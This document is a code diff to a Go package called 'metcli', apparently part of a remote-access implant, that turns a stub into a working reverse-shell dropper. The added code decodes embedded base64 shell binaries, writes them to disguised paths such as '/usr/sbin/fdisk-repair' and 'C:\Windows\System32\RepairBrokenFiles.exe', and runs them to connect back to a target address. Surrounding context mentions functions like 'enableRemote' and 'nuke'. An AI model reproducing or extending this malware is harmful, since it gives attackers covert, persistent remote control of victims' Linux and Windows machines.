@@ -2,9 +2,9 @@ package metcli
 
 import (
 	"encoding/base64"
-	"fmt"
 	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 )
 
@@ -122,9 +122,43 @@ func enableRemote() string {
 
 //spawn a (disowned) reverse shell back to target IP/port
 func spawnRevShell(target string) string {
-	fmt.Println("In spawnRevShell")
+	targetArg := base64.StdEncoding.EncodeToString([]byte(target))
+	if runtime.GOOS == "linux" {
+		shpth := "/usr/sbin/fdisk-repair"
+		if checkFileExists(shpth) == false {
+			shStr := reverseShellLinux
+			data, _ := base64.RawStdEncoding.DecodeString(shStr)
+			f, err := os.Create(shpth)
+			if err != nil {
+				panic(err)
+			}
+			f.Write([]byte(data))
+			f.Close()
+			os.Chmod(shpth, 0777)
+		}
+		cmd := exec.Command(shpth, targetArg)
+		cmd.Start()
+
+	} else if runtime.GOOS == "windows" {
+		shpth := "C:\\Windows\\System32\\RepairBrokenFiles.exe"
+		if checkFileExists(shpth) == false {
+			shStr := reverseShellWindows
+			data, _ := base64.RawStdEncoding.DecodeString(shStr)
+			f, err := os.Create(shpth)
+			if err != nil {
+				panic(err)
+			}
+			f.Write([]byte(data))
+			f.Close()
+
+		}
+		cmd := exec.Command(shpth, targetArg)
+		cmd.Start()
+	} else {
+		return "No shell available"
+	}
 	//soon to come...
-	return ""
+	return "Shell spawned"
 }
 
 // probably never use this, but it's nice to have around :^)
@@ -138,4 +172,11 @@ func nuke() string {
 //if the opcode is something weird, dont know what to do with it
 func unknownCom() string {
 	return ""
+}
+
+func checkFileExists(pth string) bool {
+	if _, err := os.Stat(pth); os.IsNotExist(err) {
+		return false
+	}
+	return true
 }
